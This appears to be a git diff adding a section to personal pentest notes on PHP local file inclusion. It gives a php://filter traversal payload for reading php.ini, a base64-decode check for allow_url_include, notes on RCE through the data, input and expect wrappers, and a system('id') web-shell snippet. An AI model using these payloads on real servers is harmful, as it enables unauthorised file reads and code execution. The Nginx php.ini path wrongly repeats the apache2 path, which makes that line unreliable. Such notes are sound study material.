@@ -15,6 +15,22 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -
 /index.php?language=php://filter/read=convert.base64-encode/resource=configure
 ```
 
+## Checking PHP Configurations
+```
+/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
+```
+- Apache: /etc/php/X.Y/apache2/php.ini
+- Nginx: /etc/php/X.Y/apache2/php.ini
+- X.Y is you install PHP version
+```
+echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+```
+- If allow_url_include = On, then it is vulnerable to RCE via the 'data' wrapper
+- Also, the 'input' wrapper (must use POST) (vulnerable parameter must accept POST) shown below
+- If extension=expect, then it is vulnerable to the 'expect' wrapper
+
+Note: To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use $_REQUEST). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. <\?php system('id')?>)
+
 ## Remote Code Execution
 
 **PHP Wrappers
